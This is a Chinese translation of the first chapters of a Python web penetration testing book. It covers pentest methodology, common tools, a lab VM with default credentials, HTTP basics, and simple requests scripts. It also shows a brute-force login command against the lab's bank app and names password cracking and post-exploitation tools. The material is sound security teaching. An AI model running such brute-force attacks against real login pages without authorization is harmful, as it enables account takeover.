# Python Web 渗透测试学习手册（一）

> 原文：[`annas-archive.org/md5/E299FE2480CB3682D0C7B9BCA1E12138`](https://annas-archive.org/md5/E299FE2480CB3682D0C7B9BCA1E12138)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 前言

欢迎学习 Python 网络渗透测试！

在本书中，我们将学习渗透测试过程，并了解如何编写我们自己的工具。

您将利用 Python 的简单性和可用的库来构建自己的 Web 应用程序安全测试工具。本书的目标是向您展示如何使用 Python 自动化大部分 Web 应用程序渗透测试活动。

希望您现在已经完全掌握了即将发生的事情，并且和我一样兴奋。

那么，让我们开始这段美妙的旅程吧。

# 本书适合对象

如果您是一名希望进入网络应用安全测试领域的网络开发人员，本书将在短时间内为您提供所需的知识！熟悉 Python 是必不可少的，但不需要达到专家级别。

# 本书涵盖的内容

第一章，“Web 应用程序渗透测试简介”，教您有关 Web 应用程序安全流程以及测试应用程序安全的重要性。

第二章，“与 Web 应用程序交互”，解释了如何使用 Python 和请求库以编程方式与 Web 应用程序进行交互。

第三章，“使用 Scrapy 进行 Web 爬虫-映射应用程序”，解释了如何使用 Python 和 Scrapy 库编写自己的爬虫。

第四章，“资源发现”，教您如何编写基本的 Web 应用程序 BruteForcer 来帮助我们进行资源发现。

第五章，“密码测试”，解释了密码质量测试，也称为密码破解。

第六章，“检测和利用 SQL 注入漏洞”，讨论了检测和利用 SQL 注入漏洞。

第七章，“拦截 HTTP 请求”，讨论了 HTTP 代理，并帮助您基于 mitmproxy 工具创建自己的代理。

# 充分利用本书

本课程的唯一先决条件是具有基本的编程或脚本编写经验，这将有助于快速理解示例。

在环境方面，您只需要下载包含易受攻击目标 Web 应用程序和 Python 环境所需所有库的虚拟机。要运行虚拟机，您需要从[`www.virtualbox.org/`](https://www.virtualbox.org/)安装虚拟机。 

# 下载示例代码文件

您可以从[www.packtpub.com](http://www.packtpub.com)的帐户中下载本书的示例代码文件。如果您在其他地方购买了本书，可以访问[www.packtpub.com/support](http://www.packtpub.com/support)注册，直接将文件发送到您的邮箱。

您可以按照以下步骤下载代码文件：

1.  在[www.packtpub.com](http://www.packtpub.com/support)登录或注册。

1.  选择“支持”选项卡。

1.  单击“代码下载和勘误”。

1.  在搜索框中输入书名，然后按照屏幕上的说明操作。

下载文件后，请确保使用最新版本的解压缩或提取文件夹：

+   WinRAR/Windows 7-Zip

+   Zipeg/iZip/UnRarX 适用于 Mac

+   7-Zip/PeaZip 适用于 Linux

本书的代码包也托管在 GitHub 上，网址为[`github.com/PacktPublishing/Learning-Python-Web-Penetration-Testing`](https://github.com/PacktPublishing/Learning-Python-Web-Penetration-Testing)。如果代码有更新，将在现有的 GitHub 存储库上进行更新。

我们还有其他代码包，来自我们丰富的图书和视频目录，可在[`github.com/PacktPublishing/`](https://github.com/PacktPublishing/)上找到。去看看吧！

# 下载彩色图片

我们还提供了一个 PDF 文件，其中包含本书中使用的屏幕截图/图表的彩色图像。您可以在这里下载：[`www.packtpub.com/sites/default/files/downloads/LearningPythonWebPenetrationTesting_ColorImages.pdf`](https://www.packtpub.com/sites/default/files/downloads/LearningPythonWebPenetrationTesting_ColorImages.pdf)。

# 使用的约定

本书中使用了许多文本约定。

`CodeInText`：表示文本中的代码词、数据库表名、文件夹名、文件名、文件扩展名、路径名、虚拟 URL、用户输入和 Twitter 句柄。这是一个例子：“如果服务器返回带有`200 OK`代码的 HTTP 响应，一些标头以及如果存在于服务器上的`test.html`内容。”

代码块设置如下：

```py
#!/usr/bin/env
import requests
r = requests.get('http://httpbin.org/ip')
print r.url
print 'Status code:'
print '\t[-]' + str(r.status_code) + '\n'
```

当我们希望引起您对代码块的特定部分的注意时，相关行或项目将以粗体显示：

```py
r = requests.get(self.url, auth=(self.username, self.password))
                if r.status_code == 200:
                    hit = "0"
```

任何命令行输入或输出都以以下形式书写：

```py
python forzaBruta-forms.py -w http://www.scruffybank.com/check_login.php -t 5 -f pass.txt -p "username=admin&password=FUZZ"
```

**粗体**：表示一个新术语、一个重要词或屏幕上看到的词。例如，菜单或对话框中的单词会在文本中出现。这是一个例子：“我们右键单击页面，然后选择查看页面源代码。”

警告或重要说明会出现在这样。

提示和技巧会出现在这样。


# 第一章：Web 应用渗透测试简介

在本章中，我们将讨论以下主题：

+   了解 Web 应用渗透测试的过程

+   典型的 Web 应用工具包

+   培训环境

让我们开始吧！

# 了解 Web 应用渗透测试的过程

在这一部分，我们将了解什么是 Web 应用渗透测试以及其背后的过程。我们将从了解什么是 Web 应用渗透测试，执行这些测试的重要性，专业方法的外观，以及我们将简要解释为什么有必要掌握使用 Python 编写自己的工具的技能开始。

渗透测试是一种安全测试，从攻击者的角度评估应用程序的安全性。这是一种进攻性的练习，你必须像攻击者一样思考，并了解开发人员以及涉及的技术，以揭示所有的缺陷。

目标是识别所有的缺陷，并展示它们如何被攻击者利用，以及对我们公司的影响。最后，报告将提供解决方案来修复已经检测到的问题。这是一个手动和动态测试。手动意味着它严重依赖于进行测试的人的知识，这就是为什么学习如何编写自己的渗透测试工具是重要的，它将在你的职业生涯中给你一个优势。动态测试是我们测试正在运行的应用程序的地方。这不是对源代码的静态分析。安全测试对我们来说是有用的，可以验证和验证应用程序安全控制的效果，并识别这些安全控制的松懈。

那么，为什么我们要进行渗透测试呢？如今，IT 已经席卷了整个世界。大部分公司的流程和数据都是由计算机处理的。这就是为什么公司需要投资于安全测试，以验证安全控制的有效性，以及很多时候它们的缺乏。

EMC 的一份报告（[`www.scmagazine.com/study-it-leaders-count-the-cost-of-breaches-data-loss-and-downtime/article/542793/`](https://www.scmagazine.com/study-it-leaders-count-the-cost-of-breaches-data-loss-and-downtime/article/542793/)）指出，每家公司的年度财务损失报告平均为停机 497,037 美元，安全漏洞 860,273 美元，数据丢失 585,892 美元。此外，公司资源都投入到事件响应和修复、测试和部署问题中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00005.gif)

这就是为什么进行渗透测试将帮助公司保护他们客户的数据、知识产权和服务。渗透测试是由四个主要部分组成的简单方法，如下所示：

+   侦察：在这个阶段，我们将收集信息，以识别所使用的技术、支持应用程序的基础设施、软件配置、负载平衡等。这个阶段也被称为指纹识别。

+   映射：然后我们进入映射阶段，在这个阶段，我们建立应用程序页面和功能的地图或图表。我们的目标是识别组件及其关系。支持映射的技术之一是蜘蛛或爬行。此外，在这个阶段，我们将通过进行暴力攻击来发现非链接资源。

+   漏洞：一旦我们将所有组件、参数、表单和功能映射出来，我们就会进入第三阶段，开始发现漏洞。

+   利用：在识别所有漏洞后，我们可以进入最后一个阶段，即利用漏洞。根据渗透测试的范围，一旦你利用了漏洞，你可以从新的优势点重新开始整个过程。通常，这是目标 DMZ，你会尝试进入他们的内部网络段。

这里没有代表的一步是报告阶段，您需要记录所有发现，以便向客户或公司呈现。

最后，有两种渗透测试，即黑盒和白盒。黑盒测试发生在您没有关于目标的任何信息时，这基本上与攻击者的情况相同，而白盒测试发生在客户提供文档、源代码和配置以加速过程时，我们只关注有趣的领域。

您可能想知道，在此过程中应该测试哪些领域？以下是一些最重要的要覆盖的领域：

+   配置和部署管理测试

+   身份管理测试

+   身份验证测试

+   授权测试

+   会话管理测试

+   输入验证

+   测试错误处理

+   密码学

+   业务逻辑测试

+   客户端测试

我们将在本章中涵盖其中一些领域。

您可以通过阅读 OWASP 测试指南来扩展对这些领域的了解：[`www.owasp.org/index.php/OWASP_Testing_Project`](https://www.owasp.org/index.php/OWASP_Testing_Project)。

那么，为什么要构建自己的工具？Web 应用程序非常不同，因为它们使用多种技术、组合、流程和实现。

这就是为什么没有一个单一的工具可以覆盖您在职业生涯中遇到的所有情况。很多时候，我们会编写脚本来测试特定问题或执行某些任务，并利用漏洞。在本书的过程中，我们将看到如何编写工具并测试不同领域，如身份验证、输入验证和发现，并最终编写一个简单的 HTTP 代理，它可能成为我们自己安全扫描仪的基础。编写自己的工具是一项宝贵的技能，将使您超越许多无法适应工具或编写自己工具的渗透测试人员。在某些渗透测试任务中，这可能产生重大影响。

# 典型的 Web 应用工具包

在本节中，我们将看看安全专业人员用于执行 Web 应用程序渗透测试的不同工具。

# HTTP 代理

测试 Web 应用程序最重要的工具是 HTTP 代理。这个工具允许您拦截浏览器和服务器之间的所有通信，双向都可以。这些代理被称为中间人代理。这些工具将让我们了解应用程序的工作方式，最重要的是，它将允许我们拦截请求、响应并修改它们。

通常，代理将在与您用于测试应用程序的浏览器相同的计算机上运行。安全专业人员最常用的 HTTP 代理是 PortSwigger 安全的 Burp Suite（[`portswigger.net/burp/proxy.html`](https://portswigger.net/burp/proxy.html)）和 OWASP 的 Zed Attack Proxy（ZAP）（[`www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project`](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project)）。我们还有 MITM 代理。这是一个在 Python 中开发的较新的替代方案，适合构建工具或自动化某些场景。缺点是它只有控制台，没有图形用户界面，对于我们的目的来说，这是一个好处。

# 爬虫和蜘蛛

爬虫和蜘蛛用于映射 Web 应用程序，自动完成目录化所有内容和功能的任务。该工具通过跟踪找到的所有链接、提交表单、分析新内容的响应并重复此过程直到覆盖整个应用程序来自动爬行应用程序。

有独立的爬虫和蜘蛛，如 Scrapy（http://scrapy.org），它们是用 Python 编写的，或者命令行工具，如 HT track（http://www.httrack.com）。我们有与 Burp 和 ZAP 等代理集成的爬虫和蜘蛛，它们将受益于通过代理传递的内容，以丰富对应用程序的了解。

这是有价值的一个很好的例子，当应用程序使用大量 JavaScript 时。传统的爬虫无法解释 JS，但浏览器可以。因此，代理会看到它并将其添加到爬虫目录中。我们稍后会更详细地了解 Scrapy。

# 漏洞扫描器

现在，让我们进入更复杂的工具：漏洞扫描器。

这些工具被认为更复杂，因为它们必须在一个工具中自动化大部分安全测试方法。它们将进行爬行、发现、漏洞检测和一些利用。最常用的两个开源 Web 应用程序安全扫描器是 w3af（http://w3af.org/）（用 Python 编写）和 Arachni（http://www.arachni-scanner.com/）（用 Ruby 编写）。

有多种商业替代方案，比如 Acunetix（http://www.acunetix.com/），这是最便宜的之一，性价比很高。

# 暴力破解/可预测的资源定位器

Web 暴力破解或发现工具用于通过字典攻击查找文件、目录、servlet 或参数等内容。这些工具使用了安全专业人员在过去 10 年中收集的词汇表，其中包含已知的文件名目录或仅在不同产品或 Web 应用程序中找到的单词。

这些类型工具的前身是 DIRB（http://dirb.sourceforge.net/），它仍然可用，并由 Dark Raver 维护。另一个很好的选择是 Wfuzz（http://www.edge-security.com/wfuzz.php），我过去开发过，现在由 Xavier Mendez 维护和开发。您可以在 Kali 中找到这个工具，这是最常用的渗透测试发行版。

诸如 Burp 和 ZAP 之类的工具提供了这些功能。所有这些工具都受益于 FUZZDB 提供的词汇表，FUZZDB 是用于 Web 应用程序测试的词汇表数据库。我们将看到如何构建一个类似于 Wfuzz 的工具来实现这个目的。

# 特定任务工具

我们有大量专注于特定任务的工具，如编码器和哈希器，Base 64、MD5、SHA1 和 Unicode。

专门用于利用特定类型漏洞的工具，例如 SQL 注入器（如 SQL map）、XSS 控制台（如 Beef，用于演示 XSS 和 DOM XSS 的影响）、扫描器（如 Dominator）等。此外，工具包中的一个重要类型是后渗透工具。

一旦您成功利用了漏洞，并帮助您控制服务器、上传文件、Shells、代理内容到内部网络，并在内部扩展攻击，这些工具就会派上用场。在测试新应用程序和技术时，有许多其他工具可以克服无限的挑战。

# 测试环境

在本节中，我们将看一下我们的测试实验室环境。我们将首先安装 VirtualBox 软件来运行我们的实验室虚拟机。我们将访问易受攻击的 Web 应用程序，熟悉文本编辑器，最后，我会给你一个重要的警告。

我们需要的第一个工具是 VirtualBox。这将允许您运行为本培训创建的实验室环境虚拟机。您可以从[`www.virtualbox.org/wiki/Downloads`](https://www.virtualbox.org/wiki/Downloads)下载 VirtualBox。选择您的主机操作系统并下载安装程序。下载 VirtualBox 后，我们可以从[`drive.google.com/open?id=0ByatLxAqtgoqckVEeGZ4TE1faVE`](https://drive.google.com/open?id=0ByatLxAqtgoqckVEeGZ4TE1faVE)下载为本课程创建的虚拟机。

文件下载完成后，我们可以继续安装 VirtualBox。

安装 VirtualBox，在我的情况下，我必须双击`.dmg`文件进行安装。按照安装说明进行操作。完成后，解压实验室虚拟机。在我的情况下，我在 OS X 中使用存档。您可以在其他平台上使用 7 ZIP。

解压后，我们将启动 VirtualBox。

打开虚拟机。一旦虚拟机在 VirtualBox 中加载，我们将启动该机器，并等待它引导，直到我们收到登录提示符。我们将使用用户名`Packt`和密码`secret`登录。

root 用户密码是`packt2016`。

现在，我们的实验室已经准备好了。为了本书的目的，我们创建了一个易受攻击的 Web 应用程序，它将允许我们使用我们自己开发的工具来测试不同类型的漏洞。该应用程序模拟了一个非常简单的银行应用程序。

它是用 PHP 和 MySQL 开发的，并由 Apache 提供。现在，我们将在我们的虚拟机中打开浏览器。加载 URL`www.scruffybank.com`。我创建了一个`/ETC/hosts`条目，将该主机名重定向到本地主机。该应用程序在虚拟机中的 Apache 服务器上运行。

您应该看到索引页面。如果单击“了解更多”，您将看到以下信息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00006.jpeg)

在右上角，您可以访问登录页面。

我们实验室中的最后一个工具是文本编辑器，我们将在其中编写脚本。一个可能的选择是 Atom，这是一个由 GitHub 开发的跨平台开源免费编辑器。请随意安装或使用您喜欢的编辑器。

要启动 Atom，转到名为 Atom 的桌面项目，编辑器将以空白文件启动。您可以开始输入代码，但在保存文件并添加扩展名之前，它不会进行语法高亮显示。

我将在我的主目录中打开一个名为`Video-3.py`的示例。这就是 Atom 中 Python 脚本的样子：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00007.jpeg)

我想强调的是，许多渗透测试活动，如果不是全部，都不允许在没有目标公司许可的情况下进行。

在许多国家，这些活动是非法的，没有适当的许可。每当你想尝试新的工具或技术时，都要使用测试环境。同样，每当你为客户执行渗透测试时，都要获得书面授权。

# 摘要

在本章中，我们看到了什么是 Web 应用程序渗透测试，为什么执行测试很重要，执行渗透测试时要遵循的方法论，需要涵盖的不同领域，以及为什么重要要学会用 Python 编写自己的工具。

我们还看到了使 Web 应用程序渗透测试工具包的工具。这有助于我们了解这些工具如何与方法论对齐，并在需要创建自己的工具时提供灵感，从中学习，并了解它们的工作原理。

我们还看到了在整本书中将要使用的实验室环境。

我们已经安装了 VirtualBox，运行了实验室虚拟机，并访问了测试 Web 应用程序 scruffy bank。我们看到了文本编辑器的一个快速示例，最后，我们看到了一个关于未经客户许可进行渗透测试后果的重要警告。

在第二章中，*与 Web 应用程序交互*，我们将学习如何使用 Python 与 Web 应用程序进行交互，了解 HTTP 请求、URL、标头、消息正文的结构，并创建一个脚本来执行请求并解释响应及其标头。


# 第二章：与 Web 应用程序交互

在上一章中，我们了解了 Web 应用程序安全流程以及为什么测试应用程序安全性很重要。在本章中，我们将看一下以下主题：

+   HTTP 协议基础知识

+   HTTP 请求的解剖

+   使用 requests 库与 Web 应用程序交互

+   分析 HTTP 响应

# HTTP 协议基础知识

在本节中，我们将学习 HTTP 协议，它是如何工作的，以及它的安全方面，以及在执行请求时支持哪些方法。

这将为您提供 HTTP 的基本知识，这对于理解如何构建工具并测试 Web 应用程序中的安全问题非常重要。

# HTTP 是什么以及它是如何工作的？

HTTP 旨在实现客户端和服务器之间的通信。

HTTP 是基于 TCP/IP 的通信协议，运行在应用层。通常，我们使用 Web 浏览器与 Web 应用程序进行交互，但在这个培训中，我们将放下浏览器，使用 Python 与 Web 应用程序进行交流。这个协议是媒体独立的。

这意味着只要客户端和服务器知道如何处理数据内容，就可以通过 HTTP 发送任何类型的数据。它是无状态的，这意味着在请求到事务期间，HTTP 服务器和客户端只是彼此知道对方的存在。由于这个特性，客户端和服务器都不会在请求之间保留信息，这在进行一些攻击时会有所帮助。

HTTP 协议有两个不同的版本：

+   **HTTP/1.0**：这为每个请求/响应事务使用一个新连接

+   **HTTP/1.1**：这是连接可以被一个或多个请求响应事务使用的地方

HTTP 不是一个安全协议，这意味着所有通信都是明文的，容易被拦截和篡改。

通常，HTTP 是在端口`80`上提供的。以下是一个简单交易的示例：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00008.jpeg)

在左侧，我们有客户端，它向服务器发送一个 HTTP `GET`请求，请求资源`test.html`。如果服务器上存在`test.html`，服务器将返回一个带有`200 OK`代码、一些标头和内容`test.html`的 HTTP 响应。

如果不存在，它将返回`404 Not Found`响应代码。这代表了 Web 应用程序世界中最基本的`GET`请求。

1994 年，引入了 HTTPS 以在 HTTP 之上增加安全性。HTTPS 本身不是一个协议，而是在**安全套接字层**（**SSL**）或**传输层安全性**（**TLS**）之上叠加 HTTP 的结果。

HTTPS 在不安全的网络上创建了一个安全通道。这确保了合理的保护，使窃听者和中间人攻击者无法轻易窃取信息，前提是使用了足够的密码套件，并且服务证书经过验证和受信任。因此，每当应用程序处理敏感信息，如银行支付、购物网站、登录页面和个人资料页面时，应该使用 HTTPS。基本上，如果我们处理流程或存储客户数据，应该使用 HTTPS。

在 HTTP 中，方法表示对所选资源执行的期望操作，也称为 HTTP 动词。HTTP/1.0 定义了三种方法：

+   `HEAD`：这将只返回标头和状态代码，不包括内容

+   `GET`：这是用于检索资源内容的标准方法，给定一个 URI

+   `POST`：这是一种用于向服务器提交内容的方法，包括表单数据、文件等

然后，HTTP/1.1 引入了以下方法：

+   `OPTIONS`：这为目标资源提供通信选项

+   `PUT`：这请求存储由给定 URI 标识的资源

+   `DELETE`：这将删除由给定 URI 标识的目标资源的所有表示

+   `TRACE`：这个方法回显接收到的请求，以便客户端可以看到中间服务器所做的更改或编辑

+   `CONNECT`：这建立了一个由 HTTPS 使用的给定 URI 标识的服务器的隧道

+   `PATCH`：此方法对资源应用部分修改

`HEAD`，`GET`，`OPTIONS`和`TRACE`按照惯例被定义为安全的，这意味着它们仅用于信息检索，不应改变服务器的状态。

另一方面，诸如`POST`，`PUT`，`DELETE`和`PATCH`之类的方法旨在执行可能在服务器或外部产生副作用的操作。除了这些方法还有更多。我鼓励你去探索它们。

我们已经看到 HTTP 是一种无状态的客户端服务器协议。

该协议不提供任何安全性，因此 HTTPS 被创建用于在 HTTP 之上添加一个安全层。我们还了解到有一些不同的方法，它们将指示服务器对所选资源执行不同的操作。

# HTTP 请求的解剖

在本节中，我们将看一下 URL 的结构、请求和响应标头，并使用 Telnet 对`GET`请求进行示例，以了解它在低级别上是如何工作的。

我打赌你现在已经看过成千上万个 URL 了。现在是停下来思考 URL 结构的时候了。让我们看看每个部分的含义：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00009.jpeg)

第一部分是 Web 应用程序中的协议。使用的两种协议是 HTTP 和 HTTPS。使用 HTTP 时，将使用端口`80`，使用 HTTPS 时，端口将是`443`。

接下来是我们要联系的主机。接下来，我们可以看到该服务器中的资源或文件位置。在这个例子中，目录是`content`，资源是`section`。然后，我们有问号符号，表示接下来要来的是查询字符串。这些是将传递给页面部分进行处理的参数。

还有一些替代方案，例如在主机之前添加用户名和密码进行身份验证，或者明确定义端口，以防 Web 服务器未在标准`80`或`443`端口上监听。

# HTTP 标头

现在，让我们谈谈标头。标头是 HTTP 请求和响应的核心部分。

它们描述了客户端和服务器之间的通信方式，并提供了有关交易的信息。我们有客户端标头，这些标头由浏览器发送。一些示例如下：

+   **User-agent**：这通知服务器用户使用的操作系统、浏览器和插件类型。

+   **Accept-encoding**：这定义了浏览器支持的编码，通常是 GZip 或 Deflate。这将压缩内容并减少每次交易的带宽时间。

+   **Referer**：这包含了引用 URL，基本上是你从哪个页面点击了该链接。

+   **Cookie**：如果我们的浏览器对其站点有 cookie，它将在 Cookie 标头中添加它们。我们还有服务器端标头，这些标头是由 Web 服务器设置的。

+   **Cache-Control**：这定义了所有缓存机制必须遵守的指令。

+   **位置**：这用于重定向。每当有`301`或`302`响应时，服务器必须发送此标头。

+   **Set-Cookie**：这是用于在用户浏览器中设置 cookie 的标头。

+   **WWW-Authenticate**：服务器使用此标头请求身份验证。当浏览器看到此标头时，它将打开一个登录窗口，要求输入用户名和密码。

这是在对[`www.packtpub.com/`](https://www.packtpub.com/)进行`GET`请求时响应标头的示例：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00010.jpeg)

我们在这里提到了一些，比如`cache-control`，`content-encoding`和`content-type`。我建议你熟悉所有这些。每当你发现一个新的标头时，都要了解它的功能。

# GET 请求

在审查 URL 结构和标头之后，让我们尝试在真实服务器上进行`GET`请求。

为了做到这一点，我将使用终端和`telnet`命令向服务器发送原始的`GET`请求。这是我们尝试通过输入 Telnet 连接来模拟浏览器的方式。

执行以下步骤：

1.  让我们切换到我们的虚拟机，打开终端并键入以下内容：

```py
telnet www.httpbin.org 80
```

`80`是我们希望 Telnet 连接的端口。`httpbin.org`是一个提供 HTTP 请求和响应服务的网站，对于测试工具非常有用。

按*Enter*。

1.  一旦连接，我们将看到以下消息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00011.jpeg)

这意味着连接已建立。

1.  接下来，让我们键入`GET /ip HTTP/1.0`并按*Enter*两次。这是我们告诉服务器，我们正在使用`GET`请求名为`/ip`的资源。然后，我们指定`HTTP/1.0`协议，然后按两次*Enter*。结果，我们从服务器得到了第一个响应：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00012.jpeg)

请注意，我们在请求中没有使用任何标头，但是我们从服务器接收了许多标头，以及资源 IP 的内容。

在这种情况下，内容是发出请求的机器的 IP 地址。

现在，让我们举一个例子，但这次请求一个带有参数的 URL。

打开终端并键入：

```py
telnet www.httpbin.org 80
GET /redirect-to?url=http://www.bing.com HTTP/1.0
```

再次，我们使用了`GET`，但这次我们请求将资源重定向到查询字符串中的 URL 参数的值[`www.bing.com`](http://www.bing.com)：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00013.jpeg)

在这种情况下，服务器基本上将浏览器重定向到提供的 URL，使用位置标头并返回`302`重定向代码。在这种情况下，什么也不会发生，因为 Telnet 不解释该标头。请记住，这是一个规则连接。

# 使用 requests 库与 Web 应用程序进行交互

在本节中，我们将开始编写 Python 代码，使用 requests 库执行 HTTP 请求。

# 请求库

Requests 是一个在 Python 中编写的 Apache 2 许可的 HTTP 库。它旨在减少使用`urllib2`和其他当前可用的 HTTP 库时所需的复杂性和工作。

这是使用`urllib2`库进行对`api.github.com`进行身份验证请求所需的代码示例：

```py
import urllib2

gh_url = 'https://api.github.com'

req = urllib2.Request(gh_url)

password_manager = urllib2.HTTPPasswordMgrWithDefaultRealm()
password_manager.add_password(None, gh_url, 'user', 'pass')

auth_manager = urllib2.HTTPBasicAuthHandler(password_manager)
opener = urllib2.build_opener(auth_manager)

urllib2.install_opener(opener)

handler = urllib2.urlopen(req)

print handler.getcode()
print handler.headers.getheader('content-type')
```

这是使用`requests`库的相同函数：

```py
import requests

r = requests.get('https://api.github.com', auth=('user', 'pass'))

print r.status_code
print r.headers['content-type']
```

这种简单性非常明显。编写脚本时，它确实简化了我们的工作。

# 我们的第一个脚本

让我们开始用 Python 编程。在这个第一个示例中，我们将使用 Python 和`requests`库执行`GET`请求：

1.  让我们在虚拟机中打开 Atom 编辑器，并通过导航到`File | New File`来创建一个新文件。

1.  我们将导入`requests`库开始。这可以通过键入`import requests`来完成。

1.  现在，我们需要创建一个名为 R 的变量，其中我们将使用`GET`方法实例化一个 requests 对象，并且目标 URL 在这种情况下是`httpbin.org/ip`：

```py
import requests
r=requests.get('http://httpbin.org/ip')
```

1.  最后，我们使用`print r.text`打印响应的内容。

1.  将文件保存在`/Examples/Section-2`文件夹中，命名为`Chapter-3.py`。

1.  让我们在终端上运行它。打开终端，并使用以下命令将目录更改为`/Example/Section-2`：

```py
cd Desktop/Examples/Section-2/ 
```

1.  接下来，我们使用以下命令运行它：

```py
python Chapter-3.py
```

我们可以看到响应主体，我们可以再次看到我的 IP：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00014.jpeg)

请记住，`/ip`在主体中返回调用者 IP。

这就是我们使用`requests`库的第一个脚本。恭喜，您正在使用 Python 与 Web 应用程序进行通信！

现在，让我们在`GET`请求中添加一个查询字符串：

1.  为了做到这一点，我们将添加一个名为**payload**的变量，其中包含一个字典，其中每个键是参数名称，值将是该参数的值。在这种情况下，参数是 URL，值将是`http://www.edge-security.com`。

1.  然后，我们将把资源更改为`/redirect-to`而不是 IP。该资源期望带有有效 URL 的参数 URL，这将重定向我们。

1.  我们还需要将有效载荷作为请求中`params`的值添加，`params=payload`：

```py
import requests
payload= {'url':'http://www.edge-security.com'}
r=requests.get('http://httpbin.org/redirect-to',params=payload)
print r.text
```

1.  然后，我们将保存它。

1.  现在，如果我们运行脚本，我们将在`python Chapter-3.py`终端中看到重定向页面的内容。就是这样。

在这里，我们在终端中有`www.edge-security.com`的所有内容：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00015.jpeg)

这就是我们如何向查询字符串添加参数。

如果我们想要查看服务器返回的返回代码怎么办？我们需要添加以下代码：

1.  让我们通过输入`print "Status code:"`来打印一些标题。

1.  然后，我们可以使用以下命令打印一些格式：

```py
print "t *" + str(r.status_code)
```

我们可以删除`print r.text`以获得更清晰的响应。

1.  我们保存它，并在终端中用 Python 和脚本的名称运行它。我们可以看到状态`200`，这意味着请求是有效的：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00016.jpeg)

现在，我们将看到如何访问响应的头部。

1.  我们将返回虚拟机中的编辑器并打开`Video-3-headers.py`文件，这样可以节省一些打字。这个脚本再次使用资源/IP。

为了访问响应头，我们使用请求对象的 headers 方法。

为了逐行打印它们，我们可以做一个循环并从`r.headers`中解压键和值。

1.  让我们尝试在终端中运行这个。

1.  我们将使用 Python 和脚本文件名。您可以看到服务器返回的不同头部，以及响应代码和响应体内容。

如果我们只想要请求头部以节省带宽并加快返回响应事务时间，我们回到编辑器并将`get`方法改为`head`方法。

我们保存脚本，然后转到控制台运行它。我们可以看到状态代码是`200`，我们得到了头部，但我们不再有响应体内容：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00017.jpeg)

这是因为使用的方法是`head`，我们只从服务器得到了头部。

# 设置头部

现在，我们将看到如何设置请求的头部。

为什么我们要这样做？因为我们可能需要添加应用程序所期望的自定义头部。我们想要伪装我们的用户代理，以使服务器误以为我们是一个移动设备。我们可能想要更改`post`头部以欺骗服务器或负载平衡，或者我们可能想要暴力破解或篡改头部值并查看应用程序如何处理它。

让我们尝试设置一个标题：

1.  返回编辑器中的脚本。我们将修改请求，将方法改回`get`，将资源从`ip`改为`headers`。这将使`http://bin.org`将我们发送的爬行头部作为响应体返回，以进行调试：

```py
#!/usr/bin/env
import requests
r = requests.get('http://httpbin.org/ip')
print r.url
print 'Status code:'
print '\t[-]' + str(r.status_code) + '\n'

print 'Server headers'
print '****************************************'
for x in r.headers:
    print '\t' + x + ' : ' + r.headers[x]
print '****************************************\n'

print "Content:\n"
print r.text
```

1.  保存它，然后运行它。

1.  我们可以看到用户代理`requests`库在每个请求中都发送`python-requests`。

1.  现在，让我们返回编辑器并将`user-agent`头部设置为一个随机测试值。我们需要添加一个名为`myheaders`的字典，其中包含一个键名，用户代理，和测试值`Iphone 6`：

```py
myheaders={'user-agent':'Iphone 6'}
```

1.  我们还需要添加请求，一个名为 headers 的参数，值为`myheaders`：

```py
#!/usr/bin/env
import requests
myheaders={'user-agent':'Iphone 6'}
r = requests.post('http://httpbin.org/post',data={'name':'packt'})
print r.url
print 'Status code:'
print '\t[-]' + str(r.status_code) + '\n'

print 'Server headers'
print '****************************************'
for x in r.headers:
    print '\t' + x + ' : ' + r.headers[x]
print '****************************************\n'

print "Content:\n"
print r.text
```

1.  让我们在控制台中再次运行它。

我们可以看到服务器接收到我们修改后的用户代理伪装成`Iphone 6`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00018.jpeg)

现在，你知道如何操作头部了。

现在我们已经看到了`get`和`head`请求，让我们来看看`post`请求，我们将发送表单参数：

1.  返回 Atom 编辑器并用`post`替换`get`方法。

1.  我们还将更改 URL。这次，我们将使用 post 资源`http://bin.org/post`并添加数据字典。

这通常是你在 Web 应用程序中看到的表单数据。在这种情况下，我们在数据字典中添加一个参数，键名为 code，值为`packt`。我们保存它，然后在控制台中运行脚本。完美；我们可以在结果中看到我们提交的值的字典形式。

恭喜，现在你知道如何使用 Python 执行不同的 HTTP 请求了！

# 分析 HTTP 响应

在本节中，我们将学习不同的 HTTP 响应状态代码和不同类别的 HTTP 响应代码。

然后，我们将编写示例来查看成功的响应或错误，最后，我们将看到一个重定向示例。

# HTTP 代码

HTTP 协议定义了五类响应代码，用于指示请求的状态：

+   **1XX-信息**：100 范围的代码用于信息目的。它仅存在于 HTTP/1.1 中。

+   **2XX-成功**：200 范围的代码用于指示客户端请求的操作已收到、理解、接受和处理。最常见的是`200 OK`。

+   **3XX-重定向**：300 范围指示客户端必须采取其他操作才能完成请求。这些代码中的大多数用于 URL 重定向。这个组中最常见的是`302 Found`代码。

+   **4XX-客户端错误**：400 范围用于指示客户端发生错误。最常见的是`404 Not Found`。

